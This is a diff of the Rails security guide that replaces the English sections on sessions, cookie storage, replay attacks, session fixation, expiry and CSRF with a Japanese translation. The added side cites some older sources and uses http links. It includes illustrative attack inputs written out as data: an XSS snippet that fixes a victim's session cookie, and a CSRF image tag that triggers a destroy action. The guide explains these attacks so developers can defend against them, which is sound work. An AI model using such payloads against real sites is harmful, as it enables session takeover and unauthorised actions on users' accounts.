@@ -1,139 +1,116 @@
-**DO NOT READ THIS FILE ON GITHUB, GUIDES ARE PUBLISHED ON https://guides.rubyonrails.org.**
+**DO NOT READ THIS FILE ON GITHUB, GUIDES ARE PUBLISHED ON http://guides.rubyonrails.org.**
 
-Securing Rails Applications
-===========================
+Rails セキュリティガイド
+============================
 
-This manual describes common security problems in web applications and how to avoid them with Rails.
+このマニュアルでは、Webアプリケーション全般におけるセキュリティの問題と、Railsでそれらの問題を回避する方法について説明します。
 
-After reading this guide, you will know:
+このガイドの内容:
 
-* All countermeasures _that are highlighted_.
-* The concept of sessions in Rails, what to put in there and popular attack methods.
-* How just visiting a site can be a security problem (with CSRF).
-* What you have to pay attention to when working with files or providing an administration interface.
-* How to manage users: Logging in and out and attack methods on all layers.
-* And the most popular injection attack methods.
+* **本ガイドで取り上げられている問題**に対するあらゆる対策
+* Railsにおけるセッションの概念、セッションに含まれる項目、セッションに対して行われることの多い攻撃
+* Webサイトを開くだけでセキュリティ問題が発生するしくみ (CSRF)
+* ファイルの取扱い上の注意、管理インターフェイスを提供する際の注意
+* いかにユーザーを管理すべきか (ログイン/ログアウトのしくみ、あらゆるレイヤにおける攻撃方法の解説)
+* 最もよく知られたインジェクション攻撃の手法
 
 --------------------------------------------------------------------------------
 
-Introduction
+はじめに
 ------------
 
-Web application frameworks are made to help developers build web applications. Some of them also help you with securing the web application. In fact one framework is not more secure than another: If you use it correctly, you will be able to build secure apps with many frameworks. Ruby on Rails has some clever helper methods, for example against SQL injection, so that this is hardly a problem.
+Webアプリフレームワークは、Webアプリケーションを容易に開発できるようにするために作られました。その中にはセキュリティを比較的高めやすいフレームワークもあります。実際のところ、あるフレームワークは他のよりも安全であるということは一概には言えません。正しく用いることができているのであれば、たいていのフレームワークで安全なWebアプリケーションを構築できます (逆に言えば、正しく用いられていなければどんなWebアプリケーションを採用しようとも安全を保つことはできません)。Ruby on Railsには、こうした問題が大事に至らないようにセキュリティを保つための便利なヘルパーメソッド (SQLインジェクション対策用など) がいくつか用意されています。
 
-In general there is no such thing as plug-n-play security. Security depends on the people using the framework, and sometimes on the development method. And it depends on all layers of a web application environment: The back-end storage, the web server, and the web application itself (and possibly other layers or applications).
+一般に、導入するだけでたちまちセキュリティを保つことができるような便利なものはありません。セキュリティは、フレームワークを使う人間に強く依存します。場合によっては開発方法もセキュリティに影響することがあります。セキュリティは、Webアプリケーションを構成するあらゆる階層 (バックエンドのストレージ、Webサーバー、Webアプリケーション自身、そしておそらく他の階層なども) に依存しています。
 
-The Gartner Group, however, estimates that 75% of attacks are at the web application layer, and found out "that out of 300 audited sites, 97% are vulnerable to attack". This is because web applications are relatively easy to attack, as they are simple to understand and manipulate, even by the lay person.
+Gartner Groupは、攻撃の75%がWebアプリケーション層に対して行われていると見積もっており、監査を受けた300のWebサイトのうち97%が脆弱性を抱えているという結果を得ています。これは、Webアプリケーションに対する攻撃は比較的行いやすく、一般人も理解や操作が可能なほどにWebアプリケーションがシンプルであるためです。
 
-The threats against web applications include user account hijacking, bypass of access control, reading or modifying sensitive data, or presenting fraudulent content. Or an attacker might be able to install a Trojan horse program or unsolicited e-mail sending software, aim at financial enrichment, or cause brand name damage by modifying company resources. In order to prevent attacks, minimize their impact and remove points of attack, first of all, you have to fully understand the attack methods in order to find the correct countermeasures. That is what this guide aims at.
+Webアプリケーションに対する脅威には、ユーザーアカウントのハイジャック、アクセス制御のバイパス、機密データの読み出しや改ざん、不正なコンテンツの表示など、さまざまなものがあります。さらに、攻撃者が金儲けまたは企業資産の改ざんによる企業イメージ損壊の目的で、トロイの木馬プログラムや迷惑メール自動送信プログラムを仕込んだりすることもありえます。このような攻撃を防ぎ、影響を最小限にとどめ、攻撃されやすいポイントを除去するためには、敵の攻撃方法を完全に理解しておくことが何よりも必要です。そうでないと、正しい対策を取ることができません。以上が本ガイドの目的です。
 
-In order to develop secure web applications you have to keep up to date on all layers and know your enemies. To keep up to date subscribe to security mailing lists, read security blogs, and make updating and security checks a habit (check the [Additional Resources](#additional-resources) chapter). It is done manually because that's how you find the nasty logical security problems.
+安全なWebアプリケーションを開発するために必要なのは、すべての階層を最新の状態に保つこと、そして敵を知ることです。最新の状態に保つためには、セキュリティメーリングリストを購読し、セキュリティブログにしっかり目を通し、更新プログラムを適用し、セキュリティチェックの習慣を身に付けることです (<a href="#追加資料">追加資料</a>の章も参照してください)。筆者はこれらのことを手動で行っていますが、これは、あえて手動で行なうことによって厄介な論理上のセキュリティ問題を発見するための方法となるからです。
 
-Sessions
+セッション
 --------
 
-This chapter describes some particular attacks related to sessions, and security measures to protect your session data.
+セッションは、セキュリティに関する考察を始めるのにおあつらえ向きです。セッションはある種の攻撃の対象になることがあります。
 
-### What are Sessions?
+### セッションとは何か
 
-INFO: Sessions enable the application to maintain user-specific state, while users interact with the application. For example, sessions allow users to authenticate once and remain signed in for future requests.
+INFO: アプリケーションはセッションを用いて、多くのユーザーがアプリケーションとやりとりできるようにしつつ、各ユーザー固有のステートを維持します。たとえばセッションを用いることで、ユーザーが認証を1回行うだけで以後のリクエストでサインインしたままにできます。
 
-Most applications need to keep track of state for users that interact with the application. This could be the contents of a shopping basket, or the user id of the currently logged in user. This kind of user-specific state can be stored in the session.
+多くのアプリケーションでは、特定のユーザーがどのような状態にあるかを追跡する必要があります。ショッピングサイトの買い物カゴや、現在ログインしているユーザーのidなどがこれに該当します。セッションという概念がなければ、ユーザーの識別・認証をリクエストを発行するたびに行わなければならなくなります。
 
-Rails provides a session object for each user that accesses the application. If the user already has an active session, Rails uses the existing session. Otherwise a new session is created.
+Railsは、アプリケーションにアクセスするユーザーごとにセッションオブジェクトを1つ提供します。ユーザーが既にアプリケーションを利用中であれば、Railsは既存のセッションを読み込み、その他の場合は新しいセッションを作成します。
 
-NOTE: Read more about sessions and how to use them in [Action Controller Overview Guide](action_controller_overview.html#session).
+NOTE: セッションとその利用法について詳しくは、[Action Controllerの概要](action_controller_overview.html#セッション)ガイドを参照してください。
 
-### Session Hijacking
+### セッションハイジャック
 
-WARNING: _Stealing a user's session ID lets an attacker use the web application in the victim's name._
+WARNING: **ユーザーのセッションIDが盗まれると、攻撃者がそのユーザーをかたってWebアプリケーションを利用できてしまいます。**
 
-Many web applications have an authentication system: a user provides a user name and password, the web application checks them and stores the corresponding user id in the session hash. From now on, the session is valid. On every request the application will load the user, identified by the user id in the session, without the need for new authentication. The session ID in the cookie identifies the session.
+多くのWebアプリケーションには何らかの認証システムがあります。ユーザーがユーザー名とパスワードを入力すると、Webアプリケーションはそれらをチェックして、対応するユーザーIDをセッションハッシュに保存します。以後、そのセッションは有効になります。リクエストが行われるたびに、Webアプリケーションはセッションで示されたユーザーidを持つユーザーを読み込みます。このときに再度認証を行なう必要はありません。セッションは、cookie内のセッションidによって識別できます。
 
-Hence, the cookie serves as temporary authentication for the web application. Anyone who seizes a cookie from someone else, may use the web application as this user - with possibly severe consequences. Here are some ways to hijack a session, and their countermeasures:
+このように、cookieはWebアプリケーションに一時的な認証機能を提供しています。他人のcookieを奪い取れれば、そのユーザーの権限でWebアプリケーションを使うことができてしまいます。これによっておそらく深刻な結果が生じる可能性があります。セッションハイジャックの手法と対策をいくつかご紹介します。
 
-* Sniff the cookie in an insecure network. A wireless LAN can be an example of such a network. In an unencrypted wireless LAN, it is especially easy to listen to the traffic of all connected clients. For the web application builder this means to _provide a secure connection over SSL_. In Rails 3.1 and later, this could be accomplished by always forcing SSL connection in your application config file:
+* セキュリティに不備のあるネットワークではcookieを覗き見することができてしまいます。無線LANは、まさにそのようなネットワークの一例です。接続されているクライアントのすべてのトラフィックをのぞき見ることは、暗号化されていない無線LANでは特に簡単に行なえます。Webアプリケーションの開発者にとっては、これは**SSLによる安全な接続の提供**が必要であるということです。Rails 3.1以降では、アプリケーションの設定ファイルでSSL接続を強制することによって達成できます。
 
     ```ruby
     config.force_ssl = true
     ```
 
-* Most people don't clear out the cookies after working at a public terminal. So if the last user didn't log out of a web application, you would be able to use it as this user. Provide the user with a _log-out button_ in the web application, and _make it prominent_.
+* 公共の端末での作業後にcookieを消去するような殊勝なユーザーはほとんどいません。最後のユーザーがWebアプリケーションからログアウトするのを忘れて立ち去っていたら、次のユーザーはそのWebアプリケーションをそのまま使えてしまいます。ユーザーには**ログアウトボタン**を提供しなければなりません。それも**よく目立つボタン**をです。
 
-* Many cross-site scripting (XSS) exploits aim at obtaining the user's cookie. You'll read [more about XSS](#cross-site-scripting-xss) later.
+* クロスサイトスクリプティング (XSS) 攻撃は、多くの場合、ユーザーのcookieを手に入れるのが目的です。<a href="#クロスサイトスクリプティング-xss">XSSの詳細</a>も参照してください。
 
-* Instead of stealing a cookie unknown to the attacker, they fix a user's session identifier (in the cookie) known to them. Read more about this so-called session fixation later.
+* 攻撃者が自分の知らないcookieをわざわざ盗み取る代りに、自分が知っているcookieのセッションidを固定してしまうという攻撃方法もあります。詳細については後述のセッション固定に関する記述を参照してください。
 
-The main objective of most attackers is to make money. The underground prices for stolen bank login accounts range from 0.5%-10% of account balance, $0.5-$30 for credit card numbers ($20-$60 with full details), $0.1-$1.5 for identities (Name, SSN & DOB), $20-$50 for retailer accounts, and $6-$10 for cloud service provider accounts, according to the [Symantec Internet Security Threat Report (2017)](https://www.symantec.com/content/dam/symantec/docs/reports/istr-22-2017-en.pdf).
+たいていの場合、攻撃者の目的は金儲けです。[Symantec Global Internet Security Threat Report](http://eval.symantec.com/mktginfo/enterprise/white_papers/b-whitepaper_internet_security_threat_report_xiii_04-2008.en-us.pdf)によると、盗まれた銀行口座アカウントの闇価格は、利用可能な資金にもよりますがだいたい10ドルから1000ドルぐらい、クレジットカード番号が0.40ドルから20ドルぐらい、オンラインオークションサイトのアカウントが1ドルから8ドルぐらい、電子メールのパスワードが4ドルから30ドルくらいで売買されているそうです。
 
-### Session Storage
+### セッションストレージ
 
-NOTE: Rails uses `ActionDispatch::Session::CookieStore` as the default session storage.
+NOTE: Railsはデフォルトのセッションストレージとして`ActionDispatch::Session::CookieStore`を用います。
 
-TIP: Learn more about other session storages in [Action Controller Overview Guide](action_controller_overview.html#session).
+TIP: その他のセッションストレージについて、[Action Controllerの概要](action_controller_overview.html#セッション)ガイドを参照してください。
 
-Rails `CookieStore` saves the session hash in a cookie on the client-side.
-The server retrieves the session hash from the cookie and
-eliminates the need for a session ID. That will greatly increase the
-speed of the application, but it is a controversial storage option and
-you have to think about the security implications and storage
-limitations of it:
+Railsの`CookieStore`はクライアント側のcookieにセッションハッシュを保存します。サーバーはこのセッションハッシュをcookieから取得することで、セッションIDの必要性を解消します。こうすることで、アプリケーションのスピードは著しく向上しますが、このストレージオプションについては議論の余地があるため、セキュリティ上の意味やストレージでの制約について以下の点を十分考えておかなければなりません。
 
-*  Cookies have a size limit of 4kB. Use cookies only for data which is relevant for the session.
+* cookieの上限は4KBです。セッションに関連するデータを保存する目的でのみcookieをお使いください。
 
-* Cookies are stored on the client-side. The client may preserve cookie contents even for expired cookies. The client may copy cookies to other machines. Avoid storing sensitive data in cookies.
+* cookieはクライアント側に保存されます。クライアントには、cookieの期限が切れた場合にもcookieの内容が残っていることがあります。また、クライアントのcookieが他のコンピュータにコピーされる可能性もあります。セキュリティ上重要なデータをcookieに保存することは避けてください。
 
-* Cookies are temporary by nature. The server can set expiration time for the cookie, but the client may delete the cookie and its contents before that. Persist all data that is of more permanent nature on the server side.
+* cookieは本質的に一時的な情報です。サーバーはcookieに期限を設定できますが、期限が切れる前にcookieやcookieの内容がクライアント側で削除される可能性があります。恒常性の高いデータは、すべてサーバー側で永続化してください。
 
-* Session cookies do not invalidate themselves and can be maliciously
-  reused. It may be a good idea to have your application invalidate old
-  session cookies using a stored timestamp.
+* セッションcookieはひとりでに失効することはないため、悪用目的で使い回される可能性もあります。保存済みのタイムスタンプを利用して古いセッションcookieをアプリケーションで失効させるのもよい方法かもしれません。
 
-* Rails encrypts cookies by default. The client cannot read or edit the contents of the cookie, without breaking encryption. If you take appropriate care of your secrets, you can consider your cookies to be generally secured.
+* Railsはcookieをデフォルトで暗号化します。クライアントは暗号を解読しないかぎりcookieの内容を読み取ることも編集することもできません。秘密情報を適切に扱っていれば、cookieのセキュリティは一般的に保たれていると考えてよいでしょう。
 
-The `CookieStore` uses the
-[encrypted](https://api.rubyonrails.org/classes/ActionDispatch/Cookies/ChainedCookieJars.html#method-i-encrypted)
-cookie jar to provide a secure, encrypted location to store session
-data. Cookie-based sessions thus provide both integrity as well as
-confidentiality to their contents. The encryption key, as well as the
-verification key used for
-[signed](https://api.rubyonrails.org/classes/ActionDispatch/Cookies/ChainedCookieJars.html#method-i-signed)
-cookies, is derived from the `secret_key_base` configuration value.
+`CookieStore`はセッションデータの保管場所を[`encrypted`](https://api.rubyonrails.org/classes/ActionDispatch/Cookies/ChainedCookieJars.html#method-i-encrypted) cookie jarで安全に暗号化します。これにより、cookieベースのセッションの内容の一貫性と機密性を同時に保ちます。暗号化鍵は、[`signed`](https://api.rubyonrails.org/classes/ActionDispatch/Cookies/ChainedCookieJars.html#method-i-signed) cookieに用いられる検証鍵と同様に、`secret_key_base`設定値から導出されます。
 
-TIP: Secrets must be long and random. Use `rails secret` to get new unique secrets.
+TIP: 秘密鍵は十分に長く、かつランダムなものにしなければなりません。一意な秘密鍵を得るには`rails secret`を使います。
 
-INFO: Learn more about [managing credentials later in this guide](security.html#custom-credentials)
+INFO: 本ガイドで後述する[credential管理方法](security.html#独自のcredential)も参照してください。
 
-It is also important to use different salt values for encrypted and
-signed cookies. Using the same value for different salt configuration
-values may lead to the same derived key being used for different
-security features which in turn may weaken the strength of the key.
+暗号化済みcookieと署名済みcookieで使うsalt値を同じにしないことも重要です。複数のsalt設定に異なる値ではなく同じsalt値を使ってしまうと、別のセキュリティ機能で同じ鍵が導出されてしまい鍵の強度が落ちる可能性があります。
 
-In test and development applications get a `secret_key_base` derived from the app name. Other environments must use a random key present in `config/credentials.yml.enc`, shown here in its decrypted state:
+test環境とdevelopment環境のアプリケーションでは、アプリケーション名から`secret_key_base`を導出します。それ以外の環境では、必ず`config/credentials.yml.enc`にあるランダムな鍵を使わなければなりません（以下は復号化された状態）。
 
     secret_key_base: 492f...
 
-WARNING: If your application's secrets may have been exposed, strongly consider changing them. Changing `secret_key_base` will expire currently active sessions.
+WARNING: 万一アプリケーションの秘密鍵が漏洩した場合は、秘密鍵の変更をぜひともご検討ください。ただし、`secret_key_base`を変更すると、現在アクティブなセッションが一斉に期限切れになります（訳注: ユーザー数の多いサイトで多数のアクティブなセッションを突然期限切れにすると、一時的にセッションが大量に再作成されて負荷が急増し、サーバーがダウンするなどの問題につながる可能性も考えられます）。
 
-### Rotating Encrypted and Signed Cookies Configurations
+### 暗号化cookieや署名済みcookieの設定をローテーションする
 
-Rotation is ideal for changing cookie configurations and ensuring old cookies
-aren't immediately invalid. Your users then have a chance to visit your site,
-get their cookie read with an old configuration and have it rewritten with the
-new change. The rotation can then be removed once you're comfortable enough
-users have had their chance to get their cookies upgraded.
+cookie設定のローテーションは、古いcookieが即座に無効にならないようにする理想的な方法です。ユーザーが次回アプリケーションを開いたときに古い設定を含むcookieを読み込み、新しい内容を再び書き込むというものです。十分多くのユーザーがcookieの更新を完了したとみなせれば、ローテーションを削除できます。
 
-It's possible to rotate the ciphers and digests used for encrypted and signed cookies.
+ローテーションは、暗号化cookieや署名済みcookieの暗号やダイジェストに対して行えます。
 
-For instance to change the digest used for signed cookies from SHA1 to SHA256,
-you would first assign the new configuration value:
+たとえば、署名済みcookieのダイジェストをSHA1からSHA256に変更する場合、最初に新しい設定値を代入します。
 
 ```ruby
 Rails.application.config.action_dispatch.signed_cookie_digest = "SHA256"
 ```
 
-Now add a rotation for the old SHA1 digest so existing cookies are
-seamlessly upgraded to the new SHA256 digest.
+後は古いSHA1ダイジェストのローテーションを追加すれば、既存のcookieがシームレスにSHA256ダイジェストにアップグレードされます。
 
 ```ruby
 Rails.application.config.action_dispatch.cookies_rotations.tap do |cookies|
@@ -141,75 +118,64 @@ Rails.application.config.action_dispatch.cookies_rotations.tap do |cookies|
 end
 ```
 
-Then any written signed cookies will be digested with SHA256. Old cookies
-that were written with SHA1 can still be read, and if accessed will be written
-with the new digest so they're upgraded and won't be invalid when you remove the
-rotation.
+以後の署名済みcookieはすべてSHA256でダイジェストされて書き込まれます。古いSHA1 cookieも従来どおり読み出され、しかもアクセス時には新しいダイジェストで書き込まれます。これによってアップグレードが完了し、かつローテーションを削除しても無効になりません。
 
-Once users with SHA1 digested signed cookies should no longer have a chance to
-have their cookies rewritten, remove the rotation.
+SHA1でダイジェストされている署名済みcookieをユーザーが更新する機会が完全になくなったことを確認できたら、ローテーションを削除します。
 
-While you can setup as many rotations as you'd like it's not common to have many
-rotations going at any one time.
+ローテーションはいくつでも好きなだけ設定できますが、一度に多数のローテーションを実施するのは一般的ではありません。
 
-For more details on key rotation with encrypted and signed messages as
-well as the various options the `rotate` method accepts, please refer to
-the
-[MessageEncryptor API](https://api.rubyonrails.org/classes/ActiveSupport/MessageEncryptor.html)
-and
-[MessageVerifier API](https://api.rubyonrails.org/classes/ActiveSupport/MessageVerifier.html)
-documentation.
+暗号化メッセージや署名済みメッセージの鍵ローテーション、および`rotate`メソッドで使えるさまざまなオプションについては、[MessageEncryptor API](https://api.rubyonrails.org/classes/ActiveSupport/MessageEncryptor.html)ドキュメントや[MessageVerifier API](https://api.rubyonrails.org/classes/ActiveSupport/MessageVerifier.html)ドキュメントを参照してください。
 
-### Replay Attacks for CookieStore Sessions
+### CookieStoreセッションに対する再生攻撃
 
-TIP: _Another sort of attack you have to be aware of when using `CookieStore` is the replay attack._
+TIP: **`CookieStore`を扱うのであれば、もう一つの攻撃方法である「再生攻撃 (replay attack)」についても知っておく必要があります。**
 
-It works like this:
+再生攻撃のしくみは次のとおりです。
 
-* A user receives credits, the amount is stored in a session (which is a bad idea anyway, but we'll do this for demonstration purposes).
-* The user buys something.
-* The new adjusted credit value is stored in the session.
-* The user takes the cookie from the first step (which they previously copied) and replaces the current cookie in the browser.
-* The user has their original credit back.
+* ユーザーがクレジットを受け取る。総額はセッションに保存されているとする (これはあくまで説明のためのものであり、やってはいけません)。
+* ユーザーがクレジットで何かを購入する。
+* 使った分減ったクレジットがセッションに保存される。
+* ここでユーザーの暗黒面が発動する。最初にブラウザに保存されていたcookieをコピーしてあったものを、現在のブラウザのcookieと差し替える。
+* ユーザーのクレジット額が元に戻る。
 
-Including a nonce (a random value) in the session solves replay attacks. A nonce is valid only once, and the server has to keep track of all the valid nonces. It gets even more complicated if you have several application servers. Storing nonces in a database table would defeat the entire purpose of CookieStore (avoiding accessing the database).
+この再生攻撃は、セッションにnonce (1回限りのランダムな値) を含めておくことで防ぐことができます。nonceが有効なのは1回限りであり、サーバーはnonceが有効かどうかを常に追跡し続ける必要があります。複数のアプリケーションサーバーで構成された合いの子アプリケーションの場合、状況はさらに複雑になります。nonceをデータベースに保存してしまうと、せっかくデータベースへのアクセスを避けるために設置したCookieStoreを使う意味がなくなってしまいます。
 
-The best _solution against it is not to store this kind of data in a session, but in the database_. In this case store the credit in the database and the logged_in_user_id in the session.
+結論から言うと、 **この種のデータはセッションではなくデータベースに保存する**のが最善です。この場合であれば、クレジットをデータベースに保存し、logged_in_user_idをセッションに保存します。
 
-### Session Fixation
+### セッション固定攻撃
 
-NOTE: _Apart from stealing a user's session ID, the attacker may fix a session ID known to them. This is called session fixation._
+NOTE: **ユーザーのセッションIDを盗む代りに、攻撃者が意図的にセッションIDを既知のものに固定するという方法があります。この手法はセッション固定 (session fixation) と呼ばれます。**
 
-![Session fixation](images/security/session_fixation.png)
+![Session fixation](images/session_fixation.png)
 
-This attack focuses on fixing a user's session ID known to the attacker, and forcing the user's browser into using this ID. It is therefore not necessary for the attacker to steal the session ID afterwards. Here is how this attack works:
+この攻撃では、ブラウザ上のユーザーのセッションIDを攻撃者が知っているセッションidに密かに固定しておき、ブラウザを使うユーザーが気付かないうちにそのセッションIDを強制的に使わせます。この方法であれば、セッションIDを盗み出す必要すらありません。攻撃方法は次のとおりです。
 
-* The attacker creates a valid session ID: They load the login page of the web application where they want to fix the session, and take the session ID in the cookie from the response (see number 1 and 2 in the image).
-* They maintain the session by accessing the web application periodically in order to keep an expiring session alive.
-* The attacker forces the user's browser into using this session ID (see number 3 in the image). As you may not change a cookie of another domain (because of the same origin policy), the attacker has to run a JavaScript from the domain of the target web application. Injecting the JavaScript code into the application by XSS accomplishes this attack. Here is an example: `<script>document.cookie="_session_id=16d5b78abb28e3d6206b60f22a03c8d9";</script>`. Read more about XSS and injection later on.
-* The attacker lures the victim to the infected page with the JavaScript code. By viewing the page, the victim's browser will change the session ID to the trap session ID.
-* As the new trap session is unused, the web application will require the user to authenticate.
-* From now on, the victim and the attacker will co-use the web application with the same session: The session became valid and the victim didn't notice the attack.
+* 攻撃者は有効なセッションIDを生成します。攻撃者はWebアプリケーションのログインページ (つまりセッション固定攻撃の対象ページ) を開き、レスポンスに含まれるcookieからセッションIDを取り出します (図の1と2を参照)。
+* 攻撃者は、セッションが期限切れにならないよう、ときどきWebアプリケーションにアクセスしてセッションを維持します。
+* ここで攻撃者は、標的ユーザーのブラウザでこのセッションIDを強制的に読み込ませます (図の3を参照)。同一生成元ポリシーの制限によって、外部ドメインから標的ユーザーのcookieを変更できないのが普通なので、攻撃者はWebサーバーのドメインを経由してJavaScriptを標的ユーザーのブラウザに送り込んで読み込ませなければなりません。クロスサイトスクリプティング (XSS) によってJavaScriptコードの注入 (インジェクション) に成功すれば、攻撃は完了です。セッションidの例: `<script>document.cookie="_session_id=16d5b78abb28e3d6206b60f22a03c8d9";</script>`。XSSとインジェクションの詳細については後述します。
+* 攻撃者は、JavaScriptが仕込まれたページに標的ユーザーを誘い込みます。標的ユーザーがブラウザでページを開くと、そのユーザーのセッションIDが攻撃者の仕込んだものと差し替えられます。
+* 標的ユーザーのブラウザでは、仕込まれたセッションIDでのログインはまだ行われていないので、Webアプリケーションはユーザーに認証を要求します。
+* 認証が完了すると、標的ユーザーと攻撃者は同じセッションを共有した状態になります。このセッションは有効なものとして扱われ、標的ユーザーは自分が攻撃されたことにも気付きません。
 
-### Session Fixation - Countermeasures
+### セッション固定攻撃 - 対応策
 
-TIP: _One line of code will protect you from session fixation._
+TIP: **セッション固定攻撃は、たった1行のコードで防止できます。**
 
-The most effective countermeasure is to _issue a new session identifier_ and declare the old one invalid after a successful login. That way, an attacker cannot use the fixed session identifier. This is a good countermeasure against session hijacking, as well. Here is how to create a new session in Rails:
+最も効果的な対応策は、ログイン成功後に古いセッションを無効にし、**新しいセッションidを発行する**ことです。これなら、攻撃者が固定セッションidを悪用する余地はありません。この対応策は、セッションハイジャックにも有効です。Railsで新しいセッションを作成する方法を以下に示します。
 
 ```ruby
 reset_session
 ```
 
-If you use the popular [Devise](https://rubygems.org/gems/devise) gem for user management, it will automatically expire sessions on sign in and sign out for you. If you roll your own, remember to expire the session after your sign in action (when the session is created). This will remove values from the session, therefore _you will have to transfer them to the new session_.
+ユーザー管理用に[Devise](https://rubygems.org/gems/devise)などの有名なgemを導入しているのであれば、ログイン/ログアウト時にセッションが自動的に切れるようになります。もし自分で管理する場合は、ログインした後 (セッションが作られた後) にセッションを切るように注意してください。上のメソッドを実行するとセッションにあるすべての値が削除されるので、**それらの値を新しいセッションに転送しておく必要があります**。
 
-Another countermeasure is to _save user-specific properties in the session_, verify them every time a request comes in, and deny access, if the information does not match. Such properties could be the remote IP address or the user agent (the web browser name), though the latter is less user-specific. When saving the IP address, you have to bear in mind that there are Internet service providers or large organizations that put their users behind proxies. _These might change over the course of a session_, so these users will not be able to use your application, or only in a limited way.
+その他の対応策として、**セッションにユーザー固有のプロパティを保存しておき**、ユーザーからリクエストを受けるたびに照合して、マッチしない場合はアクセスを拒否するという方法もあります。ユーザー固有のプロパティとして利用可能な情報には、リモートIPアドレスや user agent (= webブラウザの名前) がありますが、後者は完全にユーザー固有とは限りません。IPアドレスを保存して対応する場合、インターネットサービスプロバイダ (ISP) や大企業からのアクセスはプロキシ越しに行われていることが多いことを思い出しておく必要があります。**IPアドレスはセッションの途中で変わる可能性がある**ため、IPアドレスをユーザー固有の情報として使おうとすると、ユーザーがWebアプリケーションにアクセスできなくなったり、ユーザーの利用に制限が加わる可能性があります。
 
-### Session Expiry
+### セッションの期限切れ
 
-NOTE: _Sessions that never expire extend the time-frame for attacks such as cross-site request forgery (CSRF), session hijacking, and session fixation._
+NOTE: **セッションを無期限にすると、攻撃される機会を増やしてしまいます (クロスサイトリクエストフォージェリ (CSRF)、セッションハイジャック、セッション固定など)。**
 
-One possibility is to set the expiry time-stamp of the cookie with the session ID. However the client can edit cookies that are stored in the web browser so expiring sessions on the server is safer. Here is an example of how to _expire sessions in a database table_. Call `Session.sweep("20 minutes")` to expire sessions that were used longer than 20 minutes ago.
+セッションIDを持つcookieのタイムスタンプに有効期限を設定するという対応策も考えられなくはありません。しかし、ブラウザ内に保存されているcookieをユーザーが編集できてしまう点は変わらないので、やはりサーバー側でセッションを期限切れにする方が安全です。 **データベーステーブルのセッションを期限切れにする**には、たとえば次のように`Session.sweep("20 minutes")`を呼ぶと、20分以上経過したセッションが期限切れになります。
 
 ```ruby
 class Session < ApplicationRecord
@@ -223,51 +189,51 @@ class Session < ApplicationRecord
 end
 ```
 
-The section about session fixation introduced the problem of maintained sessions. An attacker maintaining a session every five minutes can keep the session alive forever, although you are expiring sessions. A simple solution for this would be to add a `created_at` column to the sessions table. Now you can delete sessions that were created a long time ago. Use this line in the sweep method above:
+この節では、セッション保持の問題のところで触れたセッション固定攻撃について説明します。攻撃者が5分おきにセッションを維持すると、サーバー側でセッションを期限切れにしようとしてもセッションを恒久的に継続させることができてしまいます。これに対する単純な対策は、セッションテーブルに`created_at`カラムを追加することです。これで、期限を過ぎたセッションを削除できます。上の`sweep`メソッドで以下のコードを使います。
 
 ```ruby
 delete_all "updated_at < '#{time.ago.to_s(:db)}' OR
   created_at < '#{2.days.ago.to_s(:db)}'"
 ```
 
-Cross-Site Request Forgery (CSRF)
+クロスサイトリクエストフォージェリ (CSRF)
 ---------------------------------
 
-This attack method works by including malicious code or a link in a page that accesses a web application that the user is believed to have authenticated. If the session for that web application has not timed out, an attacker may execute unauthorized commands.
+この攻撃方法は、ユーザーによる認証が完了したと考えられるWebアプリケーションのページに、悪意のあるコードやリンクを仕込むというものです。そのWebアプリケーションへのセッションがタイムアウトしていなければ、攻撃者は本来認証されていないはずのコマンドを実行できてしまいます。
 
-![](images/security/csrf.png)
+![](images/csrf.png)
 
-In the [session chapter](#sessions) you have learned that most Rails applications use cookie-based sessions. Either they store the session ID in the cookie and have a server-side session hash, or the entire session hash is on the client-side. In either case the browser will automatically send along the cookie on every request to a domain, if it can find a cookie for that domain. The controversial point is that if the request comes from a site of a different domain, it will also send the cookie. Let's start with an example:
+<a href="#セッション">セッション</a>の章で、多くのRailsアプリケーションがcookieベースのセッションを使っていることを説明しました。このとき、セッションIDをcookieに保存してサーバー側にセッションハッシュを持つか、すべてのセッションハッシュをクライアント (ブラウザ) 側に持ちます。どちらの場合にも、ブラウザはリクエストのたびにcookieを自動的にドメインに送信します (そのドメインで利用できるcookieがある場合)。ここで問題となるのは、異なるドメインに属するサイトからリクエストがあった場合にもブラウザがcookieを送信してしまうという点です。以下の例で考えてみましょう。
 
-* Bob browses a message board and views a post from a hacker where there is a crafted HTML image element. The element references a command in Bob's project management application, rather than an image file: `<img src="http://www.webapp.com/project/1/destroy">`
-* Bob's session at `www.webapp.com` is still alive, because he didn't log out a few minutes ago.
-* By viewing the post, the browser finds an image tag. It tries to load the suspected image from `www.webapp.com`. As explained before, it will also send along the cookie with the valid session ID.
-* The web application at `www.webapp.com` verifies the user information in the corresponding session hash and destroys the project with the ID 1. It then returns a result page which is an unexpected result for the browser, so it will not display the image.
-* Bob doesn't notice the attack - but a few days later he finds out that project number one is gone.
+* ボブは掲示板をブラウザで眺めていて、とあるハッカーによる書き込みを目にします。その書き込みには仕掛けのあるHTML image要素が含まれています。その要素が実際に参照しているのは画像ファイルではなく、ボブのプロジェクト管理アプリケーションを標的にしたコマンド（`<img src="http://www.webapp.com/project/1/destroy">`）です。
+* ボブはここ数分間ログアウトしていないので、`www.webapp.com` に対するボブのセッションはまだ期限切れになっていません。
+* ハッカーによる書き込みがブラウザで表示されると、ブラウザはimageタグを見つけます。そしてブラウザは `www.webapp.com` からその怪しい画像を読み出そうとします。前述のとおり、このときに有効なセッションidを含むcookieも一緒に送信されます。
+* `www.webapp.com` のWebアプリケーションは、リクエストに対応するセッションハッシュに含まれるユーザー情報が有効であると認定し、その指示に従ってID 1のプロジェクトを削除します。そしてブラウザは結果ページを表示して何らかの問題が生じたことを示します。画像は表示されません。
+* ボブは攻撃に気づいていません。しかし数日後にはプロジェクトNo.1が削除されていることに気づきます。
 
-It is important to notice that the actual crafted image or link doesn't necessarily have to be situated in the web application's domain, it can be anywhere - in a forum, blog post, or email.
+ここで重要なのは、仕掛けのある画像やリンクの置き場所はWebアプリケーションのドメインに限らないということです。フォーラム、ブログ、email、どこにでも置けます。
 
-CSRF appears very rarely in CVE (Common Vulnerabilities and Exposures) - less than 0.1% in 2006 - but it really is a 'sleeping giant' [Grossman]. This is in stark contrast to the results in many security contract works - _CSRF is an important security issue_.
+CSRFは、CVE (Common Vulnerabilities and Exposures) で報告されることはめったにありません (2006年でも0.1%以下) が、それでもGrossmanが言うところの「眠れる巨人」であり、危険なことに変わりはありません。筆者や他のセキュリティ専門家によるセキュリティ関連の実績に登場することはほとんどありませんが、**CSRFは非常に重大なセキュリティ問題である**ことは強く認識していただきたいと思います。
 
-### CSRF Countermeasures
+### CSRFへの対応策
 
